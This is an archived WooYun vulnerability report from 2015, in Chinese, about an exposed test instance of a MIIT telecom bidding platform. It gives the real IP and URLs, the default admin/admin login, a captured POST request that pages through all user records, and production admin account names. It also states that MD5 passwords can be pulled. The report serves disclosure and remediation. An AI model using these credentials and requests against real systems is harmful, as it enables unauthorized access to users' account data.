{"id": 26114, "wybug_id": "wooyun-2015-0112281", "wybug_title": "看我如何通过一个测试系统拿到某政府招投平台所有用户信息", "wybug_corp": "中华人民共和国工业和信息化部", "wybug_author": "茜茜公主", "wybug_date": "2015-05-06 00:10", "wybug_open_date": "2015-06-23 16:56", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-23：\t细节向公众公开  简要描述： 测试环境对外，目测正式环境数据库备份后给测试库使用，外加该系统本身的一个设计缺陷，造成用户帐号和密码泄漏，求上首页 详细说明：  首先是该系统的测试地址：工信部通信工程建设项目招标投标管理信息平台https://219.239.97.63/DispatchAction.do?efFormEname=POIX11\n\n该系统的正式地址为：https://txzb.miit.gov.cn/DispatchAction.do;jsessionid=E8759D3399304CB9DF7F35DC3D025FCA?efFormEname=POIX11可以看到两个系统的数据还是有区别的，测试环境因为存在弱口令，已经有人开始尝试如何shell了测试库的帐号和密码为admin/admin\n\n\n\n   漏洞证明：  缺陷存在于该系统后台管理的系统管理-用户管理模块处\n\n\n\n抓包后你会得到：\n\n\n{\"birth\":\"\",\"chineseName\":\"应急中心管理员\",\"companyId\":\"00000000000000000100\",\"companyName\":\"应急中心\",\"departName\":\"\",\"departmentId\":\"\",\"email\":\"\",\"englishName\":\"\",\"fax\":\"\",\"id\":\"00000000000000000100\",\"jobId\":\"\",\"mobile\":\"\",\"password\":\"马赛克\",\"remark\":\"\",\"sex\":\"\",\"status\":\"\",\"telephone\":\"\",\"userName\":\"马赛克\"},{\"birth\":\"\",\"chineseName\":\"应急中心管局管理员\",\"companyId\":\"33\",\"companyName\":\"应急中心管局\",\"departName\":\"\",\"departmentId\":\"\",\"email\":\"\",\"englishName\":\"\",\"fax\":\"\",\"id\":\"00000000000000000101\",\"jobId\":\"\",\"mobile\":\"\",\"password\":\"马赛克\",\"remark\":\"\",\"sex\":\"\",\"status\":\"\",\"telephone\":\"\",\"userName\":\"马赛克\"},{\"birth\":\"\",\"chineseName\":\"平台管理员\",\"companyId\":\"\",\"companyName\":\"\",\"departName\":\"\",\"departmentId\":\"\",\"email\":\"\",\"englishName\":\"\",\"fax\":\"\",\"id\":\"00000000000000001000\",\"jobId\":\"\",\"mobile\":\"\",\"password\":\"马赛克\",\"remark\":\"\",\"sex\":\"\",\"status\":\"\",\"telephone\":\"\",\"userName\":\"马赛克\"}\n可以利用系统的分页功能把所有用户信息都显示出来\nPOST https://219.239.97.63/DispatchAction.do HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: https://219.239.97.63/DispatchAction.doAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: 219.239.97.63Content-Length: 38Connection: Keep-AliveCache-Control: no-cacheCookie: JSESSIONID=720443C4ED0E18838D5AA4D3CE5442BA; 72677.52326546499=adminpage=1&pagesize=100&efFormEname=PYUR01\n我们尝试使用该测试库得到的用户，登录正式环境应急中心管理员\"userName\":\"yjzx\"，发现登录失败，得知并不是所有的帐号密码都能和正式库一一对应，但大部分还是有效的。\n\n\n\n\n\n还有个超管帐号：platadmin\n\n用同样的方法可以得到正式库所有用户的帐号名及md5密码\n\n注意我们可从该系统内得到\n\n\n\n\n\n\n\n包括但不限于以上证照   修复方案：  测试库不对外，强口令   版权声明：转载请注明来源 茜茜公主@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-05-09 16:54 厂商回复： CNVD确认所述情况,已经转由CNCERT向国家上级信息安全协调机构上报,由其后续协调网站管理单位处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}